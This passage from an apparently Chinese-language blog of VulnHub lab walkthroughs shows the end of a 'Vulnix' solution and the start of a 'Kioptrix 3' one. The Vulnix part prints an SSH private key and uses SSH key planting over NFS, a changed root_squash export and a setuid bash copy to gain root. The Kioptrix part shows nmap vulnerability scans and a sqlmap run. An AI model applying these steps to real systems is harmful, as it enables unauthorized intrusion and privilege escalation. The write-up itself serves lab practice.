class="string">wQDzzeeHsiAXeYWVjkI8dM6Vvm7dNOvvpwm+lYkRNh8tNfBw2tGzSC5Djx0ADLZxDryhoL</span></span><br><span class="line"><span class="string">osnG4dQeSeASV3gK0qRDHJgIxJyoaLNc3udOjZ+PQuTtSHWb5Ng6NxvqghTrQepab5IgtE</span></span><br><span class="line"><span class="string">qaOkquhIr4sq0FwuHfJmbDqcIqcEc7qsfdxdKnf7+E1ii1APVl9BUNODzaJmI1kUnv12YR</span></span><br><span class="line"><span class="string">cx+OYi5qbih4O6BCVkUMqYn9nIVOfwwY+ndonxV+OyOxj5tDIAAADBAPT9intj92Pnrm0c</span></span><br><span class="line"><span class="string">ZIPUdAD68FGp9jL+ca6CTnjp/7cRrlBBCd2SUoS34Demerk2q3g0xFBlfcheUpzdPr7Wh0</span></span><br><span class="line"><span class="string">bANVoeKOztj1Z5bVrICJB3kNvhpHZQ6BdscTgiWeFHBQ8OW1z4q1umPOVnX0/PH2eEHS7s</span></span><br><span class="line"><span class="string">lDkoBPU9fuj01ZQg8hHO1xb54a7Gg9paqVvfHQnvZz9Jw3z/+B9GQK8uL2UfwrTuErarGz</span></span><br><span class="line"><span class="string">kEjeOeX/Q6OC+y+2YyBsGxmdKeeByKtwAAAMEA6LiR2x5pWbKTUTklwZrX+mPGFSaRMGow</span></span><br><span class="line"><span class="string">i8M+gykhualFDvXYRb5gtluRmbmgKvIKaijYWgTWpod2p+ghg7V5KSby/oWbWo8dM7DVeR</span></span><br><span class="line"><span class="string">DPdGhJ2xFRqHhVBJ0MugjMnZFE11UAS6hPFLYl5L1Ow54pAw0f/OBVzEGuZuVnF1i84tzx</span></span><br><span class="line"><span class="string">4r70/fHHXH8d6PYtehcL1O/wjNfjkkHONI/GxwAZzzF5Yn1h1aIB4X4B6iXkj+TJIAQcHe</span></span><br><span class="line"><span class="string">vU05iNf3ixaredAAAACXJvb3RAa2FsaQE=</span></span><br><span class="line"><span class="string">-----END OPENSSH PRIVATE KEY-----</span></span><br><span class="line"><span class="string">root@kali:~/vulnhub/vulnix# cat id_rsa.pub </span></span><br><span class="line"><span class="string">ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDetmdQqLfvlrWOcE1pjVqlFGyWzJ/5gbyYysYpycTAMYRdwpp7KdrN1ewEM9//RXaRAD1dg8Eb5D+mlzqGXgGmYOL5JsQMfkpJfZI/I43Wp5gAC72R/BLHwc7FZI9Rh488I6e6rFwEDaIghKyZKrXRBHuYxKIAOqkYWMzQL/bY2Ett0RfhZKwk9s4lWEkUuf1UK1UaksL+DcK7cJgnkS24B+8BhzC+CMmNbRFvsS6/uewFpNV9wVaQJ8/MWBcbN2Gcs5Es8iDb2XQ2seTFNuHRx82lxStJE7zFJRQXwAIzE5tu5VyPNuldfyutNrF6YTz28VUbrMtHERfQWTbUQdz8Ix9iPtGsdhR6Trz0poooZ9L9fl01AjAnSR9H/OTPkvVauR6asz7Ak9qbF5yQsMQZVN2DUeYg7BWwWkpX9CIBCKM+cJB9rV/Zu5DE45KVrasPzRsZgg+Unb9l1hH8aLMz7pASv5dwJPNZgOwpPY1g75lUJE6DFNHYLIu5jgdv4zs= root@kali</span></span><br></pre></td></tr></table></figure>

<p>然后在终端上以’vulnix’用户身份将生成的ssh-key复制到’/home/vulnix/.ssh/authorized_keys’文件中：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ mkdir .ssh</span><br><span class="line">$ <span class="built_in">cd</span> .ssh</span><br><span class="line">$ <span class="built_in">pwd</span></span><br><span class="line">/mnt/vulnix/.ssh</span><br><span class="line">$ <span class="built_in">echo</span> <span class="string">&quot;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDetmdQqLfvlrWOcE1pjVqlFGyWzJ/5gbyYysYpycTAMYRdwpp7KdrN1ewEM9//RXaRAD1dg8Eb5D+mlzqGXgGmYOL5JsQMfkpJfZI/I43Wp5gAC72R/BLHwc7FZI9Rh488I6e6rFwEDaIghKyZKrXRBHuYxKIAOqkYWMzQL/bY2Ett0RfhZKwk9s4lWEkUuf1UK1UaksL+DcK7cJgnkS24B+8BhzC+CMmNbRFvsS6/uewFpNV9wVaQJ8/MWBcbN2Gcs5Es8iDb2XQ2seTFNuHRx82lxStJE7zFJRQXwAIzE5tu5VyPNuldfyutNrF6YTz28VUbrMtHERfQWTbUQdz8Ix9iPtGsdhR6Trz0poooZ9L9fl01AjAnSR9H/OTPkvVauR6asz7Ak9qbF5yQsMQZVN2DUeYg7BWwWkpX9CIBCKM+cJB9rV/Zu5DE45KVrasPzRsZgg+Unb9l1hH8aLMz7pASv5dwJPNZgOwpPY1g75lUJE6DFNHYLIu5jgdv4zs= root@kali&quot;</span> &gt; authorized_keys</span><br><span class="line">$ ls</span><br><span class="line">authorized_keys</span><br></pre></td></tr></table></figure>

<p>然后使用ssh私匙登录</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/vulnhub/vulnix<span class="comment"># ssh vulnix@192.168.66.18 -i id_rsa</span></span><br><span class="line">Welcome to Ubuntu 12.04.1 LTS (GNU/Linux 3.2.0-29-generic-pae i686)</span><br><span class="line"></span><br><span class="line"> * Documentation:  https://help.ubuntu.com/</span><br><span class="line"></span><br><span class="line">  System information as of Thu Apr 16 04:23:19 BST 2020</span><br><span class="line"></span><br><span class="line">  System load:  0.0              Processes:           92</span><br><span class="line">  Usage of /:   90.2% of 773MB   Users logged <span class="keyword">in</span>:     1</span><br><span class="line">  Memory usage: 9%               IP address <span class="keyword">for</span> eth0: 192.168.66.18</span><br><span class="line">  Swap usage:   0%</span><br><span class="line"></span><br><span class="line">  =&gt; / is using 90.2% of 773MB</span><br><span class="line"></span><br><span class="line">  Graph this data and manage this system at https://landscape.canonical.com/</span><br><span class="line"></span><br><span class="line">New release <span class="string">&#x27;14.04.6 LTS&#x27;</span> available.</span><br><span class="line">Run <span class="string">&#x27;do-release-upgrade&#x27;</span> to upgrade to it.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">The programs included with the Ubuntu system are free software;</span><br><span class="line">the exact distribution terms <span class="keyword">for</span> each program are described <span class="keyword">in</span> the</span><br><span class="line">individual files <span class="keyword">in</span> /usr/share/doc/*/copyright.</span><br><span class="line"></span><br><span class="line">Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by</span><br><span class="line">applicable law.</span><br><span class="line"></span><br><span class="line">vulnix@vulnix:~$ id</span><br><span class="line">uid=2008(vulnix) gid=2008(vulnix) groups=2008(vulnix)</span><br><span class="line">vulnix@vulnix:~$ whoami</span><br><span class="line">vulnix</span><br><span class="line">vulnix@vulnix:~$ <span class="built_in">pwd</span></span><br><span class="line">/home/vulnix</span><br></pre></td></tr></table></figure>

<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vulnix@vulnix:~$ sudo -l</span><br><span class="line">Matching <span class="string">&#x27;Defaults&#x27;</span> entries <span class="keyword">for</span> vulnix on this host:</span><br><span class="line">    env_reset, secure_path=/usr/<span class="built_in">local</span>/sbin\:/usr/<span class="built_in">local</span>/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin</span><br><span class="line"></span><br><span class="line">User vulnix may run the following commands on this host:</span><br><span class="line">    (root) sudoedit /etc/exports, (root) NOPASSWD: sudoedit /etc/exports</span><br></pre></td></tr></table></figure>

<p>很好,vulnix可以运行命令来打开/etc/exports，不用输入密码。这是发现的：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vulnix@vulnix:~$ sudoedit /etc/exports</span><br><span class="line"><span class="comment"># /etc/exports: the access control list for filesystems which may be exported</span></span><br><span class="line"><span class="comment">#               to NFS clients.  See exports(5).</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Example for NFSv2 and NFSv3:</span></span><br><span class="line"><span class="comment"># /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Example for NFSv4:</span></span><br><span class="line"><span class="comment"># /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)</span></span><br><span class="line"><span class="comment"># /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line">/home/vulnix    *(rw,root_squash)</span><br></pre></td></tr></table></figure>

<p>还记得之前说过的有关Root squashing的内容吗？（感谢课程，Owen xD）</p>
<p>用no_root_squash替换了root_squash flag。需要作弊，因为没有vulnix的密码，而且没有sudo用户执行命令/usr/sbin/exportfs -a或计算机重新引导，就无法再次导出NFS分区，所以手动重新引导（Boooooo，真是个n0o0o0o0ob !!）</p>
<ul>
<li>root_squash： 客户端的root用户映射到任何人：客户端无法使用setuid位将恶意软件留给他人执行。</li>
<li>no_root_squash：通过此选项，停用了此安全功能，从而允许客户端的root权限操作最终以root身份出现在导出的文件系统中（因此，在其余客户端中）。</li>
</ul>
<p>机器重新启动后，再次安装该分区并以本地root用户身份访问。</p>
<p>检查机器是否再次启动（再次抱歉！）：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># ping -c 4 192.168.66.18</span></span><br><span class="line">PING 192.168.66.18 (192.168.66.18) 56(84) bytes of data.</span><br><span class="line">64 bytes from 192.168.66.18: icmp_seq=1 ttl=64 time=1.04 ms</span><br><span class="line">64 bytes from 192.168.66.18: icmp_seq=2 ttl=64 time=0.279 ms</span><br><span class="line">64 bytes from 192.168.66.18: icmp_seq=3 ttl=64 time=0.482 ms</span><br><span class="line">64 bytes from 192.168.66.18: icmp_seq=4 ttl=64 time=0.492 ms</span><br><span class="line"></span><br><span class="line">--- 192.168.66.18 ping statistics ---</span><br><span class="line">4 packets transmitted, 4 received, 0% packet loss, time 3033ms</span><br><span class="line">rtt min/avg/max/mdev = 0.279/0.572/1.037/0.281 ms</span><br></pre></td></tr></table></figure>

<p>然后再次挂载分区：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># mount 192.168.66.18:/home/vulnix /mnt/vulnix</span></span><br><span class="line">root@kali:~<span class="comment"># cd /mnt/vulnix</span></span><br><span class="line">root@kali:/mnt/vulnix<span class="comment"># ls</span></span><br><span class="line">local_shell</span><br></pre></td></tr></table></figure>

<p>挂载后，获得了受害者计算机本地shell的副本，并将所有权和SID更改为root：</p>
<p>在受害者的机器上，如“vulnix”：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vulnix@vulnix:~$ cp /bin/bash local_shell</span><br><span class="line">vulnix@vulnix:~$ ls</span><br><span class="line">local_shell</span><br></pre></td></tr></table></figure>

<p>在本地计算机上，以<code>root</code>身份：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:/mnt/vulnix<span class="comment"># cat local_shell &gt; spawn_root_shell</span></span><br><span class="line">root@kali:/mnt/vulnix<span class="comment"># ls</span></span><br><span class="line">local_shell  spawn_root_shell</span><br><span class="line">root@kali:/mnt/vulnix<span class="comment"># chmod 4777 *</span></span><br><span class="line">root@kali:/mnt/vulnix<span class="comment"># ls -la</span></span><br><span class="line">总用量 1828</span><br><span class="line">drwxr-x--- 4 vulnix vulnix   4096 4月  16 02:33 .</span><br><span class="line">drwxr-xr-x 3 root   root     4096 4月  15 23:00 ..</span><br><span class="line">-rw------- 1 vulnix vulnix      0 4月  16 02:27 .bash_history</span><br><span class="line">-rw-r--r-- 1 vulnix vulnix    220 4月   3  2012 .bash_logout</span><br><span class="line">-rw-r--r-- 1 vulnix vulnix   3486 4月   3  2012 .bashrc</span><br><span class="line">drwx------ 2 vulnix vulnix   4096 4月  15 23:23 .cache</span><br><span class="line">-rwsrwxrwx 1 vulnix vulnix 920788 4月  16 02:24 local_shell</span><br><span class="line">-rw-r--r-- 1 vulnix vulnix    675 4月   3  2012 .profile</span><br><span class="line">-rwsrwxrwx 1 root   root   920788 4月  16 02:33 spawn_root_shell</span><br><span class="line">drwxr-xr-x 2 vulnix vulnix   4096 4月  15 23:21 .ssh</span><br></pre></td></tr></table></figure>

<p>然后在受害人的机器上执行shell，并保留带有flag -p的原始文件的权限：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vulnix@vulnix:~$ ls -la</span><br><span class="line">total 1828</span><br><span class="line">drwxr-x--- 4 vulnix vulnix   4096 Apr 16 07:33 .</span><br><span class="line">drwxr-xr-x 4 root   root     4096 Sep  2  2012 ..</span><br><span class="line">-rw------- 1 vulnix vulnix      0 Apr 16 07:27 .bash_history</span><br><span class="line">-rw-r--r-- 1 vulnix vulnix    220 Apr  3  2012 .bash_logout</span><br><span class="line">-rw-r--r-- 1 vulnix vulnix   3486 Apr  3  2012 .bashrc</span><br><span class="line">drwx------ 2 vulnix vulnix   4096 Apr 16 04:23 .cache</span><br><span class="line">-rwsrwxrwx 1 vulnix vulnix 920788 Apr 16 07:24 local_shell</span><br><span class="line">-rw-r--r-- 1 vulnix vulnix    675 Apr  3  2012 .profile</span><br><span class="line">-rwsrwxrwx 1 root   root   920788 Apr 16 07:33 spawn_root_shell</span><br><span class="line">drwxr-xr-x 2 vulnix vulnix   4096 Apr 16 04:21 .ssh</span><br><span class="line">vulnix@vulnix:~$ ./spawn_root_shell -p</span><br><span class="line">spawn_root_shell-4.2<span class="comment"># id</span></span><br><span class="line">uid=2008(vulnix) gid=2008(vulnix) euid=0(root) groups=0(root),2008(vulnix)</span><br><span class="line">spawn_root_shell-4.2<span class="comment"># whoami</span></span><br><span class="line">root</span><br><span class="line">spawn_root_shell-4.2<span class="comment"># cd /root</span></span><br><span class="line">spawn_root_shell-4.2<span class="comment"># ls</span></span><br><span class="line">trophy.txt</span><br><span class="line">spawn_root_shell-4.2<span class="comment"># cat trophy.txt</span></span><br><span class="line">cc614640424f5bd60ce5d5264899c3be</span><br></pre></td></tr></table></figure>

<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub257.jpg"></li>
</ul>
<h3 id="知识点总结"><a href="#知识点总结" class="headerlink" title="知识点总结"></a>知识点总结</h3><ul>
<li>通过telnet连接收集用户名敏感信息</li>
<li>finger查看用户登录信息</li>
<li>使用rpcinfo进行RPC枚举</li>
<li>使用showmount进行NFS枚举</li>
<li>hydra爆破ssh密码</li>
<li>ssh key毒化攻击getshell</li>
<li>特定linux UID权限用户登录挂载的NFS分区</li>
<li>使用ssh私匙登录ssh</li>
<li>用no_root_squash替换root_squash以停用安全功能，从而允许客户端的root权限操作最终使文件以root身份出现在导出的文件系统中（在其余客户端中）</li>
<li>客户端本地以root身份运行cat命令拷贝shell文件，并chmod 4777赋予权限，最后执行shell文件加上-p参数提权</li>
</ul>
<p><font color="red">Game over</font></p>
<p>不好意思，这次还是没有找到希腊某位大佬的傻瓜式一键通关脚本，i am so sorry about this…It’s a pity…</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/haha.jpg"></p>
<p><font color="green"><strong><em>The end,to be continue…</em></strong></font></p>
]]></content>
      <categories>
        <category>vulnhub walkthrough</category>
      </categories>
      <tags>
        <tag>vulnhub靶机练习</tag>
      </tags>
  </entry>
  <entry>
    <title>vulnhub靶机渗透[KVM3]</title>
    <url>/2019/12/13/KVM3/</url>
    <content><![CDATA[<p>名称：Kioptrix: Level 1.2 (#3)<br>发行日期：2011年4月18日</p>
<p>下载：</p>
<ul>
<li>Download: <span class="exturl" data-url="aHR0cDovL3d3dy5raW9wdHJpeC5jb20vZGx2bS9LVk0zLnJhcg==">http://www.kioptrix.com/dlvm/KVM3.rar<i class="fa fa-external-link-alt"></i></span></li>
<li>Download (Mirror): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS9raW9wdHJpeC9LVk0zLnJhcg==">https://download.vulnhub.com/kioptrix/KVM3.rar<i class="fa fa-external-link-alt"></i></span></li>
<li>Download (Torrent): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS9raW9wdHJpeC9LVk0zLnJhci50b3JyZW50">https://download.vulnhub.com/kioptrix/KVM3.rar.torrent<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<p>描述：</p>
<p>自上次Kioptrix VM挑战以来已经过去了一段时间。生活不断让您知道这些事情。<br>在看到最后两个的下载数量之后，以及无数的视频中展示了克服这些挑战的方法。我觉得需要1.2（或者只是3级）。感谢您下载并播放了前两个版本。还要感谢那些花时间为他们制作视频解决方案的人。不胜感激。<br>与其他两个一样，这一挑战也面向初学者。但是，这是不同的。增加了一些步骤，并且需要新的技能。我仍然必须成为初学者的领域。与其他方法一样，“pown”此方法的方法不止一种。很简单，而不是那么简单。记住……“轻松”或“困难”的感觉总是与自己的技能水平相关的。我从未说过这些事情异常困难或困难，但我们都需要从某个地方入手。让我告诉你，制作这些易受攻击的VM并不像看起来那么容易…<br>这个挑战很重要。一旦找到IP（DHCP客户端），请编辑主机文件并将其指向kioptrix3.com。<br>在Windows下，您可以编辑C：\Windows\System32\drivers\etc\hosts，如下所示：</p>
<a id="more"></a>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># localhost name resolution is handled within DNS itself.</span></span><br><span class="line"><span class="comment">#   127.0.0.1 localhost</span></span><br><span class="line"><span class="comment">#   ::1 localhost127.0.0.1 static3.cdn.ubi.com</span></span><br><span class="line">192.168.1.102 kioptrix3.com</span><br></pre></td></tr></table></figure>
<p>在Linux下，将是/etc/hosts<br>这里涉及一个网络应用程序，因此要使所有内容都很好并正确显示，您确实需要这样做。<br>希望您喜欢Kioptrix VM Level 1.2挑战。<br>Have fun</p>
<p>漏洞：</p>
<ul>
<li>文件包含</li>
<li>访问控制不当</li>
<li>重用凭证</li>
<li>SQL注入</li>
<li>不受限制地上传危险类型的文件</li>
<li>凭证不足</li>
</ul>
<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>上nmap</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -sn -v 192.168.84.0/24</span></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.84.144</span><br><span class="line">Host is up (0.00023s latency).</span><br><span class="line">MAC Address: 00:0C:29:44:36:85 (VMware)</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -A -v -sV -Pn -T4 --script=vuln 192.168.84.144</span></span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)</span><br><span class="line">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">| vulners: </span><br><span class="line">|   cpe:/a:openbsd:openssh:4.7p1: </span><br><span class="line">|       CVE-2010-4478   7.5     https://vulners.com/cve/CVE-2010-4478</span><br><span class="line">|       CVE-2017-15906  5.0     https://vulners.com/cve/CVE-2017-15906</span><br><span class="line">|       CVE-2016-10708  5.0     https://vulners.com/cve/CVE-2016-10708</span><br><span class="line">|       CVE-2010-4755   4.0     https://vulners.com/cve/CVE-2010-4755</span><br><span class="line">|_      CVE-2008-5161   2.6     https://vulners.com/cve/CVE-2008-5161</span><br><span class="line">80/tcp open  http    Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)</span><br><span class="line">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">| http-cookie-flags: </span><br><span class="line">|   /: </span><br><span class="line">|     PHPSESSID: </span><br><span class="line">|_      httponly flag not <span class="built_in">set</span></span><br><span class="line">| http-csrf: </span><br><span class="line">| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=192.168.84.144</span><br><span class="line">|   Found the following possible CSRF vulnerabilities: </span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.84.144:80/gallery/</span><br><span class="line">|     Form id: </span><br><span class="line">|     Form action: login.php</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.84.144:80/index.php?system=Admin</span><br><span class="line">|     Form id: contactform</span><br><span class="line">|     Form action: index.php?system=Admin&amp;page=loginSubmit</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.84.144:80/gallery/index.php</span><br><span class="line">|     Form id: </span><br><span class="line">|     Form action: login.php</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.84.144:80/gallery/gadmin/</span><br><span class="line">|     Form id: username</span><br><span class="line">|     Form action: index.php?task=signin</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.84.144:80/index.php?system=Admin&amp;page=loginSubmit</span><br><span class="line">|     Form id: contactform</span><br><span class="line">|     Form action: index.php?system=Admin&amp;page=loginSubmit</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.84.144:80/index.php?system=Blog&amp;post=1281005380</span><br><span class="line">|     Form id: commentform</span><br><span class="line">|_    Form action: </span><br><span class="line">|_http-dombased-xss: Couldn<span class="string">&#x27;t find any DOM based XSS.</span></span><br><span class="line"><span class="string">| http-enum: </span></span><br><span class="line"><span class="string">|   /phpmyadmin/: phpMyAdmin</span></span><br><span class="line"><span class="string">|   /cache/: Potentially interesting folder</span></span><br><span class="line"><span class="string">|   /core/: Potentially interesting folder</span></span><br><span class="line"><span class="string">|   /icons/: Potentially interesting folder w/ directory listing</span></span><br><span class="line"><span class="string">|   /modules/: Potentially interesting directory w/ listing on &#x27;</span>apache/2.2.8 (ubuntu) php/5.2.4-2ubuntu5.6 with suhosin-patch<span class="string">&#x27;</span></span><br><span class="line"><span class="string">|_  /style/: Potentially interesting folder</span></span><br><span class="line"><span class="string">|_http-server-header: Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch</span></span><br><span class="line"><span class="string">| http-slowloris-check: </span></span><br><span class="line"><span class="string">|   VULNERABLE:</span></span><br><span class="line"><span class="string">|   Slowloris DOS attack</span></span><br><span class="line"><span class="string">|     State: LIKELY VULNERABLE</span></span><br><span class="line"><span class="string">|     IDs:  CVE:CVE-2007-6750</span></span><br><span class="line"><span class="string">|       Slowloris tries to keep many connections to the target web server open and hold</span></span><br><span class="line"><span class="string">|       them open as long as possible.  It accomplishes this by opening connections to</span></span><br><span class="line"><span class="string">|       the target web server and sending a partial request. By doing so, it starves</span></span><br><span class="line"><span class="string">|       the http server&#x27;</span>s resources causing Denial Of Service.</span><br><span class="line">|       </span><br><span class="line">|     Disclosure date: 2009-09-17</span><br><span class="line">|     References:</span><br><span class="line">|       http://ha.ckers.org/slowloris/</span><br><span class="line">|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750</span><br><span class="line">| http-sql-injection: </span><br><span class="line">|   Possible sqli <span class="keyword">for</span> queries:</span><br><span class="line">|     http://192.168.84.144:80/index.php?page=index%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.84.144:80/index.php?page=index%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.84.144:80/index.php?system=Admin&amp;page=loginSubmit%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.84.144:80/index.php?page=index%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.84.144:80/index.php?page=index%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.84.144:80/index.php?page=index%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.84.144:80/index.php?system=Admin&amp;page=loginSubmit%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.84.144:80/index.php?page=index%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.84.144:80/index.php?page=index%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.84.144:80/index.php?page=index%27%20OR%20sqlspider</span><br><span class="line">|_    http://192.168.84.144:80/index.php?page=index%27%20OR%20sqlspider</span><br><span class="line">|_http-stored-xss: Couldn<span class="string">&#x27;t find any stored XSS vulnerabilities.</span></span><br><span class="line"><span class="string">|_http-trace: TRACE is enabled</span></span><br><span class="line"><span class="string">|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)</span></span><br><span class="line"><span class="string">| vulners: </span></span><br><span class="line"><span class="string">|   cpe:/a:apache:http_server:2.2.8: </span></span><br><span class="line"><span class="string">|       CVE-2010-0425   10.0    https://vulners.com/cve/CVE-2010-0425</span></span><br><span class="line"><span class="string">|       CVE-2011-3192   7.8     https://vulners.com/cve/CVE-2011-3192</span></span><br><span class="line"><span class="string">|       CVE-2017-7679   7.5     https://vulners.com/cve/CVE-2017-7679</span></span><br><span class="line"><span class="string">|       CVE-2013-2249   7.5     https://vulners.com/cve/CVE-2013-2249</span></span><br><span class="line"><span class="string">|       CVE-2009-1891   7.1     https://vulners.com/cve/CVE-2009-1891</span></span><br><span class="line"><span class="string">|       CVE-2009-1890   7.1     https://vulners.com/cve/CVE-2009-1890</span></span><br><span class="line"><span class="string">|       CVE-2012-0883   6.9     https://vulners.com/cve/CVE-2012-0883</span></span><br><span class="line"><span class="string">|       CVE-2018-1312   6.8     https://vulners.com/cve/CVE-2018-1312</span></span><br><span class="line"><span class="string">|       CVE-2013-1862   5.1     https://vulners.com/cve/CVE-2013-1862</span></span><br><span class="line"><span class="string">|       CVE-2014-0231   5.0     https://vulners.com/cve/CVE-2014-0231</span></span><br><span class="line"><span class="string">|       CVE-2014-0098   5.0     https://vulners.com/cve/CVE-2014-0098</span></span><br><span class="line"><span class="string">|       CVE-2013-6438   5.0     https://vulners.com/cve/CVE-2013-6438</span></span><br><span class="line"><span class="string">|       CVE-2011-3368   5.0     https://vulners.com/cve/CVE-2011-3368</span></span><br><span class="line"><span class="string">|       CVE-2010-1452   5.0     https://vulners.com/cve/CVE-2010-1452</span></span><br><span class="line"><span class="string">|       CVE-2010-0408   5.0     https://vulners.com/cve/CVE-2010-0408</span></span><br><span class="line"><span class="string">|       CVE-2009-2699   5.0     https://vulners.com/cve/CVE-2009-2699</span></span><br><span class="line"><span class="string">|       CVE-2008-2364   5.0     https://vulners.com/cve/CVE-2008-2364</span></span><br><span class="line"><span class="string">|       CVE-2007-6750   5.0     https://vulners.com/cve/CVE-2007-6750</span></span><br><span class="line"><span class="string">|       CVE-2009-1195   4.9     https://vulners.com/cve/CVE-2009-1195</span></span><br><span class="line"><span class="string">|       CVE-2012-0031   4.6     https://vulners.com/cve/CVE-2012-0031</span></span><br><span class="line"><span class="string">|       CVE-2011-3607   4.4     https://vulners.com/cve/CVE-2011-3607</span></span><br><span class="line"><span class="string">|       CVE-2016-4975   4.3     https://vulners.com/cve/CVE-2016-4975</span></span><br><span class="line"><span class="string">|       CVE-2013-1896   4.3     https://vulners.com/cve/CVE-2013-1896</span></span><br><span class="line"><span class="string">|       CVE-2012-4558   4.3     https://vulners.com/cve/CVE-2012-4558</span></span><br><span class="line"><span class="string">|       CVE-2012-3499   4.3     https://vulners.com/cve/CVE-2012-3499</span></span><br><span class="line"><span class="string">|       CVE-2012-0053   4.3     https://vulners.com/cve/CVE-2012-0053</span></span><br><span class="line"><span class="string">|       CVE-2011-4317   4.3     https://vulners.com/cve/CVE-2011-4317</span></span><br><span class="line"><span class="string">|       CVE-2011-3639   4.3     https://vulners.com/cve/CVE-2011-3639</span></span><br><span class="line"><span class="string">|       CVE-2011-3348   4.3     https://vulners.com/cve/CVE-2011-3348</span></span><br><span class="line"><span class="string">|       CVE-2011-0419   4.3     https://vulners.com/cve/CVE-2011-0419</span></span><br><span class="line"><span class="string">|       CVE-2010-0434   4.3     https://vulners.com/cve/CVE-2010-0434</span></span><br><span class="line"><span class="string">|       CVE-2008-2939   4.3     https://vulners.com/cve/CVE-2008-2939</span></span><br><span class="line"><span class="string">|       CVE-2016-8612   3.3     https://vulners.com/cve/CVE-2016-8612</span></span><br><span class="line"><span class="string">|       CVE-2012-2687   2.6     https://vulners.com/cve/CVE-2012-2687</span></span><br><span class="line"><span class="string">|_      CVE-2011-4415   1.2     https://vulners.com/cve/CVE-2011-4415</span></span><br></pre></td></tr></table></figure>

<p>发现存在sqli注入和phpmyadmin目录,直接上sqlmap<br>点击下图所示位置burp抓包之后直接sqlmap跑</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># sqlmap -r sqlmap.txt </span></span><br><span class="line">        ___</span><br><span class="line">       __H__                                                                                           </span><br><span class="line"> ___ ___[)]_____ ___ ___  &#123;1.3.12<span class="comment">#stable&#125;                                                              </span></span><br><span class="line">|_ -| . [<span class="string">&#x27;]     | .&#x27;</span>| . |                                                                              </span><br><span class="line">|___|_  [(]_|_|_|__,|  _|                                                                              </span><br><span class="line">      |_|V...       |_|   http://sqlmap.org                                                            </span><br><span class="line"></span><br><span class="line">[!] legal disclaimer: Usage of sqlmap <span class="keyword">for</span> attacking targets without prior mutual consent is illegal. It is the end user<span class="string">&#x27;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] starting @ 04:14:33 /2019-12-13/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[04:14:33] [INFO] parsing HTTP request from &#x27;</span>sqlmap.txt<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[04:14:33] [INFO] resuming back-end DBMS &#x27;</span>mysql<span class="string">&#x27; </span></span><br><span class="line"><span class="string">[04:14:33] [INFO] testing connection to the target URL</span></span><br><span class="line"><span class="string">[04:14:33] [WARNING] the web server responded with an HTTP error code (500) which could interfere with the results of the tests</span></span><br><span class="line"><span class="string">sqlmap resumed 